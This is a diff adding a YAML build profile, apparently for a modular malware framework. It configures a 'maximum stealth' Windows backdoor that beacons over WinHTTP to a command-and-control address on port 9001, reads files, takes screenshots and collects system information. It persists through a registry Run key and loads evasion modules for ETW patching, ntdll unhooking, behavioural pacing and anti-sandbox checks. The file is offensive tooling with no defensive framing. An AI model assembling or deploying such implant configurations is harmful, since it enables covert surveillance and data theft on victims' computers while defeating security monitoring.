@@ -1,0 +1,27 @@
+name: backdoor_stealth_max
+description: Maximum stealth backdoor — all evasion layers, minimal API commands, WinHTTP C2
+
+core:
+  - core/emit_buffer
+  - core/file_ops
+
+c2: c2/winhttp_beacon
+
+commands:
+  - commands/cmd_sysinfo
+  - commands/cmd_fileread
+  - commands/cmd_screenshot
+
+arch: arch/backdoor
+persist: persist/registry_run
+
+evasion:
+  - evasion/etw_patch
+  - evasion/unhook_ntdll
+  - evasion/behavioral_pacing
+  - evasion/anti_sandbox
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
+  BEACON_INTERVAL_MS: "60000"
